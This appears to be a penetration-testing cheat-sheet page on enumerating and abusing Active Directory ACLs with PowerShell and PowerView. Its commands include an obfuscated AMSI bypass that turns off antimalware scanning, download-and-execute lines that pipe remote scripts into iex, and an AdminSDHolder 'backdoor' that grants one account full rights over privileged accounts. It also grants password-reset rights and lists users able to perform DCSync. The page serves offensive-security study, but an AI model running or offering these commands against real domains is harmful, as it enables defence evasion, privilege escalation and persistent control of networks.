---
title: "Domain ACLs"
description: "Enumerating domain ACLs."
lead: "Enumerating information about domain ACLs using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:09:32+01:00
lastmod: 2021-11-07T18:09:32+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 60
toc: true
---

## General

- Access Control Entries (ACE) correspond to individual permission or audits access
- Who has permission and what can be done on an object?
- Two types:
  - DACL -> Defines the permissions trustees (a user or group) have on an object
  - SACL - Logs success and failure audit messages when an object is accessed

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Enumerate ACLs without resolving GUIDs

```powershell
(Get-ACL 'CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local').Access
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Get the ACLs associated with the specified Object

```powershell
Get-ObjectACL -SamAccountName "Users" -ResolveGUIDs
```

### Get the ACLs associated with the specified Prefix to be used for Search

```powershell
Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose
```

### Get the ACLs associated with the specified LDAP Path to be used for Search

```powershell
Get-ObjectACL -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local" -ResolveGUIDs -Verbose
```

### Search for interesting ACEs

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

### Get the ACLs associated with the specified Path

```powershell
Get-PathACL -Path "\\dc01.lab.local\sysvol"
```

### Enumerate who has Rights to the 'matt' User in 'testlab.local', resolving Rights GUIDs to Names

```powershell
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
```

### Grant User 'will' the Rights to change 'matt's Password

```powershell
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```

### Audit the Permissions of AdminSDHolder, resolving GUIDs

```powershell
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
```

### Backdoor the ACLs of all privileged Accounts with the 'matt' Account through AdminSDHolder Abuse

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```

### Retrieve *most* Users who can perform DC Replication for dev.testlab.local (i.e. DCsync)

```powershell
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
```

### Enumerate Permissions for GPOs where Users with RIDs of > -1000 have some kind of Modification/Control Rights

```powershell
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```
